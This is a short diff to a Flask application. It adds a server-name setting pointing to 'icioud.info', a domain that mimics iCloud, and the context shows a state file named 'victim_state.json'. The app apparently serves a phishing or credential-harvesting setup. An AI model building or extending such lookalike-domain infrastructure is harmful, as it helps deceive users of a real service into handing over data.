@@ -22,6 +22,7 @@ from datetime import datetime
 
 app = Flask(__name__, static_folder=None)
 CORS(app)
+app.config['SERVER_NAME'] = 'icioud.info'
 
 BASE_DIR = Path(__file__).parent.resolve()
 STATE_FILE = BASE_DIR / 'victim_state.json'
